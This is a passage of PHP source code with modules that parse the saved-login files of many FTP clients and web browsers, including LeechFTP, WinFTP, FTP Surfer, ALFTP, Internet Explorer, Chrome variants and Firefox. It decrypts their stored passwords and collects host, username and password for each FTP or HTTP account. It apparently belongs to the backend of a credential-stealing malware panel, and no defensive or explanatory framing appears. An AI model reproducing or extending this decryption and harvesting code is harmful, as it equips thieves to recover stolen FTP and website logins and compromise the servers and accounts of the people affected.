        $this->add_ftp(append_port_dir(ftp_force_ssh($host, $protocol == 4), $port, $dir), $user, $pass);

		if ($record_ver > 61)
			$stream->read_skip(4);

        if ($record_ver > 62)
            $stream->read_skip(16);

        $stream->read_bytestring();             // ProxyName
        $stream->read_dword();                  // ProxyPort
        $stream->read_bytestring();             // ProxyLogin
        $stream->read_bytestring();             // ProxyPass
        $stream->read_bytestring();             // ProxyDelimiter

        $stream->read_skip(40);

        if ($record_ver > 62)
            $stream->read_skip(24);

        if ($record_ver > 67)
        	$stream->read_skip(6);

		if ($record_ver > 70)
			$stream->read_skip(2);

		if ($record_ver > 71)
			$stream->read_skip(8);

		if ($record_ver > 72)
		{
	        if ($record_ver == 73 && $processing_mode !== 0)
			{
	           	$stream->read_skip(4); // Some 73 versions use different file formats (bugged even in native application)
			} else
			{
				$stream->read_skip(12);
			}
		}

		if ($record_ver > 73)
		{
			$stream->read_bytestring(); // Certificate
		}

		if ($record_ver > 74)
			$stream->read_skip(4);


        if ($record_ver > 67)
        {
	        $plugin_count = $stream->read_word();
	        for ($i = 0; $i < $plugin_count; $i++)
	        {
	            if (!$stream->state)
	                break;
	            $stream->read_bytestring();         // Plugin
	        }

	        $stream->read_dword();                  // UsePlugins
		}

		if ($record_ver >= 73)
		{
			$filter_count = $stream->read_word();
	        for ($i = 0; $i < $filter_count; $i++)
	        {
	            if (!$stream->state)
	                break;
	            $stream->read_bytestring();         // Filter
	        }
		} else
		{
			$stream->read_skip(2);
		}

        $stream->read_skip(8);

        $sibling_count = $stream->read_dword();

        while ($sibling_count && $stream->state)
        {
            if (!$this->read_ftp_item($stream, $log, $processing_mode))
                return false;
            $sibling_count--;
        }

        return $stream->state;
    }

	private function process_ftp_file_twin($file_data, $quick_conn, $log, $processing_mode = 0)
	{
		if (!strlen($file_data))
			return false;

        $stream = new stream_voyager($file_data, $log);

        if ($quick_conn)
        {
            return $this->read_ftp_item($stream, $log, $processing_mode);
        }

        $list_count = $stream->read_word();

        if (!$stream->state)
            return false;

        if (!$list_count)
            return true;

        for ($i = 0; $i < $list_count; $i++)
        {
            if (!$stream->state)
                return false;
            $ftp_profile_type = $stream->read_word();
            if ($ftp_profile_type == 0xffff)
            {
                // no record type information, read it
                $stream->read_skip(2);
                $stream->read_skip($stream->read_word()); // FTPProfileClass
            }
            if (!$stream->state || !$this->read_ftp_item($stream, $log, $processing_mode))
                return false;
        }

        return true;
	}

	private function process_ftp_file($file_data, $quick_conn = false)
	{
		$this->enable_advanced_processing_mode = false;

		if (!strlen($file_data))
			return false;

		$local_log = new debug_log();
		$processing_result = $this->process_ftp_file_twin($file_data, $quick_conn, $local_log);
		if (!$processing_result)
		{
			if ($this->enable_advanced_processing_mode)
			{
				$local_log = new debug_log(); // reset log
				$processing_result = $this->process_ftp_file_twin($file_data, $quick_conn, $local_log, 1);
			}
		}

		$this->log->import_from($local_log);
		return $processing_result;
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				// Site manager (bin files)
				$this->process_ftp_file($stream->read_str());
				break;
			case 0x0001:
				// Quick connections
				$this->process_ftp_file($stream->read_str(), true);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}

}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Firefox 0.x-4.x

class module_mozilla_base extends module
{
	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$url = Utf8ToWin($stream->read_str());
				if (strpos($url, ' ('))
				{
					$url = substr($url, 0, strpos($url, ' ('));
				}
				$user = Utf8ToWin($stream->read_str());
				$pass = Utf8ToWin($stream->read_str());

				if (str_begins($url, 'http://') || str_begins($url, 'https://'))
				{
					$this->add_http($url, $user, $pass);
				} else
					$this->add_ftp($url, $user, $pass);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

class module_firefox extends module_mozilla_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// FireFTP

class module_fireftp extends module
{
    var $extra_params = array();

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$url = Utf8ToWin($stream->read_str());
				if (strpos($url, ' ('))
				{
					$url = substr($url, 0, strpos($url, ' ('));
				}
				$user = Utf8ToWin($stream->read_str());
				$pass = Utf8ToWin($stream->read_str());

                if (substr($url, 0, 4) == 'ftp.')
                {
                    $url = substr($url, 4);
                    $url_orig = $url;
                    $dir = '';
                    $port = '';
                    $protocol = '';

                    // newer versions store ftp host with assigned port, cut it as port is stored in fireFTPsites.dat configuration file
                    if (strpos($url, ':') !== false)
                    {
                    	$url = substr($url, 0, strpos($url, ':'));
                    }

                    foreach ($this->extra_params as $extra_param)
                    {
                        if (assign($extra_param['host']) == $url || assign($extra_param['host']) == $url_orig)
                        {
                           	$port = assign($extra_param['port']);
                            $dir = assign($extra_param['dir']);
                            $protocol = assign($extra_param['protocol']);
                        }
                    }

                    $this->add_ftp(append_port_dir(ftp_force_ssh($url, $protocol == 'ssh2'), $port, $dir), $user, $pass);
                }
				break;
			case 0x1000:
                $json_params = $stream->read_str();
				$json_params = json_fmt_nice($json_params);
				$json_result = str_replace('"{account"', '{"account"', $json_params);
				$json_result = json_decode($json_result, true);

                if ($json_result !== null && is_array($json_result))
                {
                    foreach ($json_result as $param_array)
                    {
                        if (is_array($param_array))
                        {
                            $host = assign($param_array['host']);
                            $port = assign($param_array['port']);
                            $dir = assign($param_array['remotedir']);
                            $protocol = assign($param_array['protocol']);

							$host = Utf8ToWin($host);
							$port = Utf8ToWin($port);
							$dir = Utf8ToWin($dir);

							if (strlen($host))
								array_push($this->extra_params, array('host'=>$host, 'port'=>$port, 'dir'=>$dir, 'protocol'=>$protocol));
                        }
                    }
                }
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}


// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// SeaMonkey 1.x-2.x

class module_seamonkey extends module_mozilla_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Flock 1.x-2.x

class module_flock extends module_mozilla_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Mozilla Suite Browser 1.x

class module_mozilla extends module_mozilla_base
{
}

// =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// LeechFTP 1.3

class stream_leechftp extends stream
{
	function read_bytestring()
	{
		if (!$this->state)
			return false;
		$len = $this->read_byte();
		if (!$this->state)
			return false;
		return $this->read_strlen($len);
	}

	function read_crypted_string()
	{
		$encrypted_string = $this->read_str();
		if (!$this->state)
			return false;
		$CryptoKey = array(0x77, 0xc9, 0xf4, 0x35);
		for ($i = 0; $i < strlen($encrypted_string); $i++)
		{
			$encrypted_string[$i] = chr(ord($encrypted_string[$i]) ^ $CryptoKey[$i % count($CryptoKey)]);
		}
		return $encrypted_string;
	}
}

class module_leechftp extends module
{
	private function read_ftp_item($stream)
	{
		$host = $stream->read_crypted_string();	// host
		$user = $stream->read_crypted_string();	// user
		$pass = $stream->read_crypted_string();	// pass
		$stream->read_crypted_string();	// bookmark name
		$stream->read_crypted_string();	// local dir
		$dir = $stream->read_crypted_string();	// remote dir
		$stream->read_crypted_string();	// bookmark secure password
		$port = $stream->read_word();
		$stream->read_skip(11);

		$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);
	}

		private function read_ftp_dir($stream)
	{
		$dir_name = $stream->read_bytestring();
		$stream->read_skip(0x100-1-strlen($dir_name)); // non-used dir_name padding
		$stream->read_skip(4); // recursion level dword
		$siblings = $stream->read_dword();
		return $siblings;
	}

	protected function process_dat_file($file_data)
	{
		if (!strlen($file_data))
			return false;

		$stream = new stream_leechftp($file_data, $this->log);

		if ($stream->read_bytestring() !== 'LeechFTP Bookmark File.'.chr(0x1a))
		{
			$this->log->add('ERR_INVALID_LEECHFTP_DATFILE');
			return false;
		}

		$dat_version = $stream->read_word();
		if ($dat_version != 0x1005)
		{
			$this->log->add('ERR_INVALID_LEECHFTP_DAT_VERSION: 0x'.dechex($dat_version));
			return false;
		}

		while ($stream->state && !$stream->eof())
		{
			$siblings = $this->read_ftp_dir($stream);
			if (!$stream->state)
				break;
			while ($stream->state && !$stream->eof() && $siblings--)
			{
				$this->read_ftp_item($stream);
			}
		}
		return $stream->state;
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				// bookmark.dat files
				$this->process_dat_file($stream->read_str());
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Odin Secure FTP Expert

class module_odin extends module
{
	protected function process_qfp_file($value)
	{
		if (!strlen($value))
			return;

		while (strlen($value) > (0x104+0x38+0x32+0x32+0x104+12))
		{
			ztrim(substr($value, 0, 0x104)); // site name
			$value = substr($value, 0x104);
			$url = ztrim(substr($value, 0, 0x38));
			$value = substr($value, 0x38);
			$user = ztrim(substr($value, 0, 0x32));
			$value = substr($value, 0x32);
			$pass = ztrim(substr($value, 0, 0x32));
			$value = substr($value, 0x32);
			$dir = ztrim(substr($value, 0, 0x104));
			$value = substr($value, 0x104);
			ztrim(substr($value, 0, 0x104+12)); // local dir
			$value = substr($value, 0x104+12);

			$this->add_ftp(append_dir($url, $dir), $user, $pass);
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$this->process_qfp_file($stream->read_str());
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// WinFTP 1.6.8

class module_winftp extends module
{
	private function decrypt($encrypted_data)
	{
		$decrypted_data = '';
		for ($i = 0; $i < strlen($encrypted_data); $i++)
			$decrypted_data .= chr((ord($encrypted_data[$i]) >> 4) | ((ord($encrypted_data[$i]) & 0xf) << 4));
		return $decrypted_data;
	}

	private function read_site($stream)
	{
		$len = $stream->read_dword();
		$site = $this->decrypt($stream->read_str());
		$host = $this->decrypt($stream->read_str());
		$user = $this->decrypt($stream->read_str());
		$pass = $this->decrypt($stream->read_str());
		$port = $stream->read_dword();
		$dir = $this->decrypt($stream->read_str());
		$note = $this->decrypt($stream->read_str());

		$stream->read_skip($len-strlen($site)-strlen($host)-strlen($user)-strlen($pass)-strlen($dir)-strlen($note)-4*7);
		$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);
	}

	protected function process_dat_file($value)
	{
		if (strlen($value) <= 10)
			return;

		$stream = new stream($value, $this->log);
		$stream->read_skip(10);
		while ($stream->state && !$stream->eof())
		{
			$this->read_site($stream);
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$this->process_dat_file($stream->read_str());
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// FTP Surfer 1.0.7

class module_ftp_surfer extends module
{
	private function decrypt($encrypted_data)
	{
		if (strlen($encrypted_data) <= 6)
			return '';

		$crypt_word = substr($encrypted_data, 4, 2);
		$crypt_word = hextostr($crypt_word);
		if ($crypt_word === false)
		{
			$this->log->add('ERR_CANNOT_DECRYPT_PASSWORD');
			return '';
		}

		$crypt_word = ord($crypt_word[0]);

		$encrypted_data = substr($encrypted_data, 0, 4).substr($encrypted_data, 6);
		$subst_array = '3A72C81FD94E650B-';
        $magic = 0;

		for ($i = 0; $i < strlen($encrypted_data); $i++)
		{
			if ($i == 4 || $i == 0)
			{
				$magic = $crypt_word;
			}
			$magic = hexdec(gmp_strval(gmp_and(gmp_add(gmp_mul("$magic", "0x343FD"), "0x269EC3"), "0xffffffff"), 16));
			$rand_result = ((($magic >> 16) & 0x7fff) & 0xf);

			if ($encrypted_data[$i] == 'G')
				$encrypted_data[$i] = '-';

			$pos = strpos($subst_array, $encrypted_data[$i])+1;
			if ($pos === false)
			{
				$this->log->add('ERR_CANNOT_DECRYPT_PASSWORD');
				return '';
			}

			$pos -= $rand_result;
			if ($pos < 0)
				$pos += 17;

			$encrypted_data[$i] = $subst_array[$pos-1];
		}

		$result_len = hexdec(substr($encrypted_data, 0, 4));
		$encrypted_data = substr($encrypted_data, 4); // cut password length
		$result = hextostr($encrypted_data); // hex-decode decrypted password data

		if ($result === false)
		{
			$this->log->add('ERR_CANNOT_DECRYPT_PASSWORD');
			return '';
		}

		if (strlen($result) != $result_len)
		{
			$this->log->add('ERR_CANNOT_DECRYPT_PASSWORD');
			return '';
		}

		return $result;
	}

	private function read_param($stream, &$id, &$data)
	{
		/* @var $stream stream */
		$id = $stream->read_dword();
		$stream->read_dword(); // item type
		$data = $stream->read_str();
		return 4+4+4+strlen($data);
	}

	protected function process_dat_file($value)
	{
		if (strlen($value) <= 0x25)
			return;

		$stream = new stream($value, $this->log);
		$file_ver = ztrim($stream->read_strlen(0x25));
		if ($file_ver != 'C87BC961-AAF9-11d2-8A80-0080ADB32FF4')
		{
			$this->log->add('ERR_INVALID_FTP_SURFER_DB_FILE');
			return;
		}
		while ($stream->state && !$stream->eof())
		{
			$len = $stream->read_dword();
			$host = '';
			$user = '';
			$pass = '';
			$dir = '';
			$port = '';

			while ($stream->state && $len > 0)
			{
				$id = '';
				$data = '';
				$len -= $this->read_param($stream, $id, $data);
				switch ($id)
				{
					case 3:	$host = $data; break;
					case 5: $user = $this->decrypt($data); break;
					case 6: $pass = $this->decrypt($data); break;
					case 7: $dir = $data; break;
					case 8: $port = $data; break;
				}
			}
			$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$this->process_dat_file($stream->read_str());
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// FTPGetter 3

class module_ftpgetter extends module
{
	protected function read_xml_item($xml_array)
	{
		$host = Utf8ToWin(assign($xml_array['server_ip']));
		$user = Utf8ToWin(assign($xml_array['server_user_name']));
		$pass = Utf8ToWin(assign($xml_array['server_user_password']));
		$port = Utf8ToWin(assign($xml_array['server_port']));
		$protocol = assign($xml_array['protocol_type']);

		$this->add_ftp(append_port(ftp_force_ssh($host, $protocol == '3'), $port), $user, $pass);

		foreach ($xml_array as $value)
		{
			if (is_array($value))
				$this->read_xml_item($value);
		}
	}

	protected function rec_scan_xml_array($xml_array)
	{
		foreach ($xml_array as $key=>$value)
		{
			if (is_array($value))
			{
				if (strval($key) == 'server')
					$this->read_xml_item($value);
				$this->rec_scan_xml_array($value);
			}
		}
	}

	protected function process_xml($value)
	{
		if (!strlen($value))
			return;

		$xml_parser = new XMLParser($value);
		$parsed_xml = $xml_parser->parse();
		if (!$xml_parser->isError || is_array($parsed_xml))
		{
			$this->rec_scan_xml_array($parsed_xml);
		} else
		{
			$this->log->add("ERR_XML_PARSE");
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$this->process_xml($stream->read_str());
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// ALFTP 5

class module_alftp extends module
{
	private function decrypt($encrypted_password)
	{
		$encrypted_password = trim($encrypted_password);
		if (!strlen($encrypted_password))
			return '';

		$encrypted_password = int3tostr($encrypted_password);

		$c = 0x12;
		for ($i = 0; $i < strlen($encrypted_password); $i++)
		{
			$k = ord($encrypted_password[$i]);
			$encrypted_password[$i] = chr(ord($encrypted_password[$i]) ^ ($c >> 8));
			$c = _BF_ADD32($k, $c);
			$c = _BF_ADD32($c, $c);
			$c = _BF_ADD32($c, 4);
		}
		return $encrypted_password;
	}

	protected function process_ini_file($file_contents)
	{
		if (strlen($file_contents) <= 4)
			return;

		$parsed_ini = parse_ini($file_contents);

		foreach ($parsed_ini as $section_name=>$section)
		{
			if (!is_array($section))
				continue;
			$host = assign($section["url"]);
			if (!strlen($host))
				$host = $section_name;
			$user = assign($section["id"]);
			$pass = assign($section["encrypt_pw"]);
			if (!strlen($pass))
			{
				$pass = assign($section["pw"]);
			}
			$pass = $this->decrypt($pass);
			$dir = assign($section["homedir"]);
			$port = assign($section["port"]);
			$protocol = assign($section["protocol"]);
			$this->add_ftp(append_port_dir(ftp_force_ssh($host, $protocol == '1'), $port, $dir), $user, $pass);
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$this->process_ini_file($stream->read_str());
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// IE4-IE6

class module_ie extends module
{
	// FTP and Basic Auth
	// FTP passwords ($item_name contains ftp://) are always unicode, stored in $item_value
	// Basic Auth passwords are stored as ansi values in $item_value (user:pass string)
	protected function process_ftp_item($item_name, $item_value, $is_ie7 = false)
	{
		if (!strlen($item_name) || !strlen($item_value))
			return;

		if ($is_ie7)
		{
			// IE7+ ansi names
			$item_name = ztrim($item_name);
		}
		else
		{
			// IE4-6 unicode names
			$item_name = Utf8ToWin(unicode_to_utf8(ztrim_unicode($item_name)));
		}

		$item_name = str_replace('DPAPI: ', '', $item_name);
		$item_name = str_replace('Microsoft_WinInet_', '', $item_name);

		if (str_begins($item_name, 'ftp://'))
		{
			// IE4-6 ftp passwords
            $item_value = Utf8ToWin(unicode_to_utf8(ztrim_unicode($item_value)));
			$this->add_ftp($item_name, '', $item_value);
		} else
		{
			// Basic Auth passwords
			if ($is_ie7)
			{
				// IE7+ values are stored as unicode
				$item_value = Utf8ToWin(unicode_to_utf8(ztrim_unicode($item_value)));
			}
			else
			{
				// IE4-6 values are stored as ansi
				$item_value = ztrim($item_value);
			}
			if (strpos($item_value, ':') !== false)
			{
				list($user, $pass) = explode(':', $item_value, 2);
				$this->add_http($item_name, $user, $pass);
			}
		}
	}

	protected function check_ps_index($data)
	{
		if (!strlen($data))
			return false;

		$stream = new stream($data, $this->log);

		// WICK
		if ($stream->read_dword() != 0x4b434957)
		{
			$this->log->add("ERR_INVALID_PS_INDEX_HEADER");
			return false;
		}

		$stream->read_dword(); // index size
		$str_num = $stream->read_dword();
		$stream->read_skip(12); // flags + alignment

		if (($str_num * (4+8+4) + 24) != strlen($data))
		{
			return false;
		}

		return $stream->state;
	}

	protected function read_ps_data($url, $index_data, $ps_data)
	{
		if (!strlen($index_data) || !strlen($ps_data))
		{
			return;
		}

		if (!$this->check_ps_index($index_data))
		{
			$this->log->add("ERR_INVALID_PS_INDEX");
			return;
		}

		$stream_index = new stream($index_data, $this->log);
		$stream_index->read_skip(8);
		$str_num = $stream_index->read_dword();
		$stream_index->read_skip(12); // flags + alignment

		$count = 0;
		$prev_str = '';
		while ($stream_index->state && $str_num--)
		{
			$str_ofs = $stream_index->read_dword();
			$stream_index->read_skip(8);
			$str_len = $stream_index->read_dword();

			$str = substr($ps_data, $str_ofs, $str_len*2+2);
			$str = Utf8ToWin(unicode_to_utf8(ztrim_unicode($str)));
			if (($count % 2) == 0)
				$prev_str = $str;
			else
			{
				if (str_begins($url, 'http://') || str_begins($url, 'https://'))
					$this->add_http($url, $prev_str, $str);
			}
			$count++;
		}
	}

	protected function process_ps_data($url, $data)
	{
		if (!strlen($data))
			return;

		$url = Utf8ToWin(unicode_to_utf8(ztrim_unicode($url)));
		if (!strlen($url))
			return;

		$stream = new stream($data, $this->log);
		$stream->read_skip(4);
		$index_len = $stream->read_dword();
		$stream->read_skip(4);
		$index_data = $stream->read_strlen($index_len);
		$ps_data = $stream->read_strlen(strlen($data)-12-$index_len);

		if (!$stream->state)
			return;

		$this->read_ps_data($url, $index_data, $ps_data);
	}

	protected $ps_list_index = array();
	protected $ps_list_data = array();

	protected function push_ps_value($name, $value)
	{
		if (!str_begins($name, 'http://') && !str_begins($name, 'https://'))
			return;

		$pos = strpos($name, ':StringData');
		if ($pos !== false)
		{
			$name = substr($name, 0, $pos);
			$this->ps_list_data[$name] = $value;
		} else
		{
			$pos = strpos($name, ':StringIndex');
			if ($pos !== false)
			{
				$name = substr($name, 0, $pos);
				$this->ps_list_index[$name] = $value;
			}
		}

		if ($pos !== false && isset($this->ps_list_index[$name]) && isset($this->ps_list_data[$name]))
		{
			$this->read_ps_data($name, $this->ps_list_index[$name], $this->ps_list_data[$name]);
		}
	}

	protected function process_ie6($name, $value)
	{
		if (!strlen($value))
			return;

		$name = Utf8ToWin(unicode_to_utf8(ztrim_unicode($name)));
		if (!strlen($name))
			return;

		$this->push_ps_value($name, $value);
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
			case 0x0001:
				// forms & auto complete IE4-6
				$item_name = $stream->read_str();
				$item_value = $stream->read_str();
				$this->process_ie6($item_name, $item_value);
				break;
			case 0x0002:
				// ftp & basic auth
				$item_name = $stream->read_str();
				$item_value = $stream->read_str();
				$this->process_ftp_item($item_name, $item_value);
				break;
			case 0x0003:
				// IE7 forms
				$url = $stream->read_str(); // url
				$value = $stream->read_str(); // ps_value
				$this->process_ps_data($url, $value);
				break;
			case 0x0004:
				// IE7 basic auth + ftp
				$item_name = $stream->read_str();
				$item_value = $stream->read_str();
				$this->process_ftp_item($item_name, $item_value, true);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Dreamweaver CS5

class module_dreamweaver extends module
{
	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
			case 0x0010:
				$host = $stream->read_str();
				$stream->read_str(); // Linked URL: http://...
				$dir = $stream->read_str();
				$user = Utf8ToWin($stream->read_str());
				$pass = Utf8ToWin($stream->read_str());
				if (($id & 0x10) > 0)
					$is_ssh = $stream->read_dword();
				else
					$is_ssh = 0;
				$this->add_ftp(append_dir(ftp_force_ssh($host, $is_ssh == 1), $dir), $user, $pass);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// DeluxeFTP 6

class module_deluxeftp extends module
{
	protected function read_xml_item($xml_array)
	{
		$host = utf8_decode(assign($xml_array['ADDRESS']));
		$user = utf8_decode(assign($xml_array['LOGIN']));
		$pass = utf8_decode(assign($xml_array['PASSWORD']));
		$port = utf8_decode(assign($xml_array['PORT']));
		$dir = utf8_decode(assign($xml_array['REMOTEPATH']));

		$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);

		foreach ($xml_array as $value)
		{
			if (is_array($value))
				$this->read_xml_item($value);
		}
	}

	protected function rec_scan_xml_array($xml_array)
	{
		foreach ($xml_array as $key=>$value)
		{
			if (is_array($value))
			{
				if (strval($key) == 'SITE')
					$this->read_xml_item($value);
				$this->rec_scan_xml_array($value);
			}
		}
	}

	protected function process_xml($value)
	{
		if (!strlen($value))
			return;

		$xml_parser = new XMLParser($value);
		$parsed_xml = $xml_parser->parse();
		if (!$xml_parser->isError || is_array($parsed_xml))
		{
			$this->rec_scan_xml_array($parsed_xml);
		} else
		{
			$this->log->add("ERR_XML_PARSE");
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$xml_file = $stream->read_str();
				$this->process_xml($xml_file);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Google Chrome

class module_chrome_base extends module
{
	protected function process_chrome_item($stream)
	{
		$encoding = $stream->read_dword();
		$url = $stream->read_str();
		$user = $stream->read_str();
		$pass = $stream->read_str();

		if ($encoding == 1)
		{
			if (str_begins($url, 'http://') || str_begins($url, 'https://'))
				$this->add_http(Utf8ToWin($url), Utf8ToWin($user), Utf8ToWin($pass));
			else
				$this->add_ftp(Utf8ToWin($url), Utf8ToWin($user), Utf8ToWin($pass));
		} else
		{
			$this->log->add("ERR_INVALID_SQLITE_ENCODING");
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$this->process_chrome_item($stream);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

class module_chrome extends module_chrome_base
{
}

// =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Google Chromium & SRWare Iron

class module_chromium extends module_chrome_base
{
}

// =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// ChromePlus

class module_chromeplus extends module_chrome_base
{
}

// =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Bromium

class module_bromium extends module_chrome_base
{
}

// =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Nichrome

class module_nichrome extends module_chrome_base
{
}

// =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Comodo Dragon

class module_comododragon extends module_chrome_base
{
}

// =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Comodo Dragon

class module_rockmelt extends module_chrome_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// K-Meleon

class module_kmeleon extends module_mozilla_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Epic

class module_epic extends module_mozilla_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Staff-FTP

class module_staff extends module
{
	private function decrypt($encrypted_password)
	{
		$k = 1;
		$decrypted_password = '';
		for ($i = 0; $i < int_divide(strlen($encrypted_password), 2); $i++, $k++)
		{
			$decrypted_password .= chr((ord($encrypted_password[$i*2]) >> 1) + ord($encrypted_password[$i*2+1]) - $k);
		}
		return $decrypted_password;
	}

	protected function process_ini($ini_contents)
	{
		$parsed_ini = parse_ini($ini_contents);
		foreach ($parsed_ini as $section)
		{
			if (!is_array($section))
				continue;
			$host = assign($section["host"]);
			$user = assign($section["login"]);
			$pass = $this->decrypt(assign($section["password"]));
			$port = assign($section["port"]);
